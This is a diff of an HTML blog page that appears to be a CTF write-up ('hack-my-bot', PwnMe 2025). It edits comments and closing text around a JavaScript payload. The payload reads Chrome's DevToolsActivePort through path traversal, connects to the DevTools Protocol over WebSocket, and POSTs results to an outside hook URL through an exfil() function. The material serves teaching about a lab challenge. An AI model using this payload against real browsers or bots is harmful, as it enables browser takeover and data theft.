@@ -762,14 +762,18 @@ Let&rsquo;s try:</p>
 <p>Let&rsquo;s illustrate that in code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// grab devtools endpoint via path traversal
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(
 </span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;http://localhost/logs../browser_cache/DevToolsActivePort&#34;</span>
 </span></span><span style="display:flex;"><span>        ).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> [<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">path</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">devTools</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// connect to CDP in browser context
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">devTools</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#a6e22e">devTools</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// utility function to exfiltrate relevant results
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">data</span>) {
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">hook</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;message&#34;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
@@ -829,9 +833,10 @@ Let&rsquo;s try:</p>
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stack</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>})();
-</span></span></code></pre></div><p>Running it, and if everything is correct, we get a callback with our lovely flag:
-<img src="posts/hack-my-bot-pwnme-2025-ctf/flag.png"></p>
-<p>Thank you for reading, hope you learnt something new, and see you in the next one 👋</p>
+</span></span></code></pre></div><p>Running our payload, and if everything is correct, we get a callback with our lovely flag:
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/flag.png"></p>
+<p>Notice how we got the minimal Chrome markup we see when we open a local file, pretty cool imo.</p>
+<p>That&rsquo;s it for this post, don&rsquo;t hesitate to leave your questions in the comments or hit me up on Discord <strong>@aelmo1</strong>.</p>
 
       </div></div>
 
